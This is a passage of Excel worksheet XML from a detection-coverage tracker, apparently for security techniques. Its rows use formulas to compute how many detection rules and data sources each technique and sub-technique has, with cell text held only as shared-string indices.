        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O545" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P545" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S54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45" t="s">
        <v>2513</v>
      </c>
      <c r="U545" t="s">
        <v>2578</v>
      </c>
      <c r="W545" t="b">
        <v>1</v>
      </c>
      <c r="X545" t="s">
        <v>2549</v>
      </c>
    </row>
    <row r="546" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A546" t="s">
        <v>2549</v>
      </c>
      <c r="B546" t="s">
        <v>2579</v>
      </c>
      <c r="C546" t="s">
        <v>2580</v>
      </c>
      <c r="D546" t="s">
        <v>1</v>
      </c>
      <c r="E546" t="s">
        <v>2540</v>
      </c>
      <c r="F546" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G546" s="9" cm="1">
        <f t="array" ref="G546">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H546" s="9" t="str" cm="1">
        <f t="array" ref="H546">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I546" s="9" t="str" cm="1">
        <f t="array" ref="I546">IF(SUM(IF($C546=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C546=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J546" s="9" t="str" cm="1">
        <f t="array" ref="J54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46" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M546" s="9" cm="1">
        <f t="array" ref="M546">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N546" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O546" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P546" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S54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46" t="s">
        <v>2513</v>
      </c>
      <c r="U546" t="s">
        <v>2581</v>
      </c>
      <c r="W546" t="b">
        <v>1</v>
      </c>
      <c r="X546" t="s">
        <v>2549</v>
      </c>
    </row>
    <row r="547" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A547" t="s">
        <v>2582</v>
      </c>
      <c r="B547" t="s">
        <v>2582</v>
      </c>
      <c r="C547" t="s">
        <v>77</v>
      </c>
      <c r="D547" t="s">
        <v>1</v>
      </c>
      <c r="E547" t="s">
        <v>2583</v>
      </c>
      <c r="F547" s="9">
        <f t="shared" si="8"/>
        <v>2</v>
      </c>
      <c r="G547" s="9" cm="1">
        <f t="array" ref="G547">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H547" s="9" cm="1">
        <f t="array" ref="H547">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I547" s="9" t="str" cm="1">
        <f t="array" ref="I547">IF(SUM(IF($C547=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C547=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J547" s="9" cm="1">
        <f t="array" ref="J54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547" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M547" s="9" cm="1">
        <f t="array" ref="M547">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N547" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O547" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P547" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S54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47" t="s">
        <v>2513</v>
      </c>
      <c r="U547" t="s">
        <v>2584</v>
      </c>
      <c r="V547" t="s">
        <v>2585</v>
      </c>
      <c r="W547" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="548" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A548" t="s">
        <v>2582</v>
      </c>
      <c r="B548" t="s">
        <v>2586</v>
      </c>
      <c r="C548" t="s">
        <v>2587</v>
      </c>
      <c r="D548" t="s">
        <v>1</v>
      </c>
      <c r="E548" t="s">
        <v>2583</v>
      </c>
      <c r="F548" s="9">
        <f t="shared" si="8"/>
        <v>2</v>
      </c>
      <c r="G548" s="9" cm="1">
        <f t="array" ref="G548">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H548" s="9" t="str" cm="1">
        <f t="array" ref="H548">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I548" s="9" t="str" cm="1">
        <f t="array" ref="I548">IF(SUM(IF($C548=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C548=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J548" s="9" t="str" cm="1">
        <f t="array" ref="J54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48" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M548" s="9" cm="1">
        <f t="array" ref="M548">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N548" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O548" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P548" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S54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48" t="s">
        <v>2513</v>
      </c>
      <c r="U548" t="s">
        <v>2588</v>
      </c>
      <c r="V548" t="s">
        <v>2589</v>
      </c>
      <c r="W548" t="b">
        <v>1</v>
      </c>
      <c r="X548" t="s">
        <v>2582</v>
      </c>
    </row>
    <row r="549" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A549" t="s">
        <v>2582</v>
      </c>
      <c r="B549" t="s">
        <v>2590</v>
      </c>
      <c r="C549" t="s">
        <v>2591</v>
      </c>
      <c r="D549" t="s">
        <v>1</v>
      </c>
      <c r="F549" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G549" s="9" cm="1">
        <f t="array" ref="G549">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H549" s="9" t="str" cm="1">
        <f t="array" ref="H549">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I549" s="9" t="str" cm="1">
        <f t="array" ref="I549">IF(SUM(IF($C549=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C549=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J549" s="9" t="str" cm="1">
        <f t="array" ref="J54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49" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M549" s="9" cm="1">
        <f t="array" ref="M549">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N549" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O549" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P549" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S54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49" t="s">
        <v>2513</v>
      </c>
      <c r="U549" t="s">
        <v>2592</v>
      </c>
      <c r="V549" t="s">
        <v>2593</v>
      </c>
      <c r="W549" t="b">
        <v>1</v>
      </c>
      <c r="X549" t="s">
        <v>2582</v>
      </c>
    </row>
    <row r="550" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A550" t="s">
        <v>2582</v>
      </c>
      <c r="B550" t="s">
        <v>2594</v>
      </c>
      <c r="C550" t="s">
        <v>2595</v>
      </c>
      <c r="D550" t="s">
        <v>1</v>
      </c>
      <c r="F550" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G550" s="9" cm="1">
        <f t="array" ref="G550">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H550" s="9" t="str" cm="1">
        <f t="array" ref="H550">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I550" s="9" t="str" cm="1">
        <f t="array" ref="I550">IF(SUM(IF($C550=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C550=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J550" s="9" t="str" cm="1">
        <f t="array" ref="J55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50" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M550" s="9" cm="1">
        <f t="array" ref="M550">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N550" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O550" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P550" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S55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50" t="s">
        <v>2513</v>
      </c>
      <c r="U550" t="s">
        <v>2596</v>
      </c>
      <c r="V550" t="s">
        <v>2597</v>
      </c>
      <c r="W550" t="b">
        <v>1</v>
      </c>
      <c r="X550" t="s">
        <v>2582</v>
      </c>
    </row>
    <row r="551" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A551" t="s">
        <v>2598</v>
      </c>
      <c r="B551" t="s">
        <v>2598</v>
      </c>
      <c r="C551" t="s">
        <v>40</v>
      </c>
      <c r="D551" t="s">
        <v>1</v>
      </c>
      <c r="E551" t="s">
        <v>2583</v>
      </c>
      <c r="F551" s="9">
        <f t="shared" si="8"/>
        <v>2</v>
      </c>
      <c r="G551" s="9" cm="1">
        <f t="array" ref="G551">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H551" s="9" cm="1">
        <f t="array" ref="H551">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I551" s="9" t="str" cm="1">
        <f t="array" ref="I551">IF(SUM(IF($C551=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C551=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J551" s="9" cm="1">
        <f t="array" ref="J55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551" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M551" s="9" cm="1">
        <f t="array" ref="M551">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N551" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O551" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P551" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S55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51" t="s">
        <v>2513</v>
      </c>
      <c r="U551" t="s">
        <v>2599</v>
      </c>
      <c r="V551" t="s">
        <v>2600</v>
      </c>
      <c r="W551" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="552" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A552" t="s">
        <v>2598</v>
      </c>
      <c r="B552" t="s">
        <v>2601</v>
      </c>
      <c r="C552" t="s">
        <v>2602</v>
      </c>
      <c r="D552" t="s">
        <v>1</v>
      </c>
      <c r="E552" t="s">
        <v>2583</v>
      </c>
      <c r="F552" s="9">
        <f t="shared" si="8"/>
        <v>2</v>
      </c>
      <c r="G552" s="9" cm="1">
        <f t="array" ref="G552">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H552" s="9" t="str" cm="1">
        <f t="array" ref="H552">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I552" s="9" t="str" cm="1">
        <f t="array" ref="I552">IF(SUM(IF($C552=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C552=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J552" s="9" t="str" cm="1">
        <f t="array" ref="J55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52" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M552" s="9" cm="1">
        <f t="array" ref="M552">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N552" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O552" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P552" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S55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52" t="s">
        <v>2513</v>
      </c>
      <c r="U552" t="s">
        <v>2603</v>
      </c>
      <c r="V552" t="s">
        <v>2604</v>
      </c>
      <c r="W552" t="b">
        <v>1</v>
      </c>
      <c r="X552" t="s">
        <v>2598</v>
      </c>
    </row>
    <row r="553" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A553" t="s">
        <v>2598</v>
      </c>
      <c r="B553" t="s">
        <v>2605</v>
      </c>
      <c r="C553" t="s">
        <v>2606</v>
      </c>
      <c r="D553" t="s">
        <v>1</v>
      </c>
      <c r="F553" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G553" s="9" cm="1">
        <f t="array" ref="G553">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H553" s="9" t="str" cm="1">
        <f t="array" ref="H553">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I553" s="9" t="str" cm="1">
        <f t="array" ref="I553">IF(SUM(IF($C553=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C553=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J553" s="9" t="str" cm="1">
        <f t="array" ref="J55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53" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M553" s="9" cm="1">
        <f t="array" ref="M553">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N553" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O553" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P553" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S55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53" t="s">
        <v>2513</v>
      </c>
      <c r="U553" t="s">
        <v>2607</v>
      </c>
      <c r="V553" t="s">
        <v>2593</v>
      </c>
      <c r="W553" t="b">
        <v>1</v>
      </c>
      <c r="X553" t="s">
        <v>2598</v>
      </c>
    </row>
    <row r="554" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A554" t="s">
        <v>2598</v>
      </c>
      <c r="B554" t="s">
        <v>2608</v>
      </c>
      <c r="C554" t="s">
        <v>2609</v>
      </c>
      <c r="D554" t="s">
        <v>1</v>
      </c>
      <c r="F554" s="9">
        <f t="shared" si="8"/>
        <v>1</v>
      </c>
      <c r="G554" s="9" cm="1">
        <f t="array" ref="G554">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H554" s="9" t="str" cm="1">
        <f t="array" ref="H554">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I554" s="9" t="str" cm="1">
        <f t="array" ref="I554">IF(SUM(IF($C554=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C554=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J554" s="9" t="str" cm="1">
        <f t="array" ref="J55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54" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M554" s="9" cm="1">
        <f t="array" ref="M554">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N554" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O554" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P554" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S55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54" t="s">
        <v>2513</v>
      </c>
      <c r="U554" t="s">
        <v>2610</v>
      </c>
      <c r="V554" t="s">
        <v>2597</v>
      </c>
      <c r="W554" t="b">
        <v>1</v>
      </c>
      <c r="X554" t="s">
        <v>2598</v>
      </c>
    </row>
    <row r="555" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A555" t="s">
        <v>2611</v>
      </c>
      <c r="B555" t="s">
        <v>2611</v>
      </c>
      <c r="C555" t="s">
        <v>64</v>
      </c>
      <c r="D555" t="s">
        <v>1</v>
      </c>
      <c r="E555" t="s">
        <v>2612</v>
      </c>
